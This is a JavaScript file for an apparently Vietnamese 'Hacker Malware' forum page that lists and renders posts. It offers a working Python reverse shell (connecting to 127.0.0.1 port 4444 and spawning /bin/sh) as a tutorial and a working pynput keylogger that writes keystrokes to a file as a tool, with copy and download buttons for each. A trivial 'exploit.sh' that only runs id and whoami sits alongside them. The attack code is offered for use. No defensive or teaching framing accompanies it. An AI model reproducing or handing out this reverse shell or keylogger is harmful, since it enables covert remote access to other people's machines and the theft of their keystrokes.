const posts = {
  news: [
    {
      title: "Tin nóng Hacker Malware",
      content: "Hacker Malware vừa ra mắt diễn đàn mới với nhiều công cụ và tutorial.",
      type: "news"
    }
  ],

  tutorials: [
    {
      title: "Cách viết shell đơn giản",
      content: `
# Python Reverse Shell
import socket,subprocess,os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
      `,
      type: "tutorial"
    }
  ],

  tools: [
    {
      title: "Simple Exploit Tool",
      content: `
#!/bin/bash
echo "[*] Exploit running..."
id
whoami
      `,
      type: "tool",
      filename: "exploit.sh"
    },
    {
      title: "Keylogger Python",
      content: `
from pynput import keyboard

def on_press(key):
    with open("keys.txt", "a") as f:
        f.write(str(key) + "\\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
      `,
      type: "tool",
      filename: "keylogger.py"
    }
  ]
};

// ==== Render Function ====
function renderPosts(tabId) {
  const container = document.getElementById(tabId);
  container.innerHTML = "";

  posts[tabId].forEach((post, index) => {
    let html = `
      <div class="card">
        <h2>${post.title}</h2>
    `;

    if (post.type === "news") {
      html += `<p>${post.content}</p><button class="btn-sm">Read</button>`;
    }

    if (post.type === "tutorial") {
      html += `
        <pre><code id="tut-${index}">${post.content.trim()}</code></pre>
        <button class="btn-sm" onclick="copyCode('tut-${index}')">Copy</button>
      `;
    }

    if (post.type === "tool") {
      html += `
        <pre><code id="tool-${index}">${post.content.trim()}</code></pre>
        <button class="btn-sm" onclick="copyCode('tool-${index}')">Copy</button>
        <button class="btn-sm" onclick="downloadCode('tool-${index}','${post.filename}')">Download</button>
      `;
    }

    html += `</div>`;
    container.innerHTML += html;
  });
}

// ==== Copy Function ====
window.copyCode = function(id) {
  const code = document.getElementById(id).innerText;
  navigator.clipboard.writeText(code).then(() => {
    alert("✅ Copied!");
  });
};

// ==== Download Function ====
window.downloadCode = function(id, filename) {
  const code = document.getElementById(id).innerText;
  const blob = new Blob([code], { type: "text/plain;charset=utf-8" });
  const link = document.createElement("a");
  link.href = URL.createObjectURL(blob);
  link.download = filename || "code.txt";
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
};
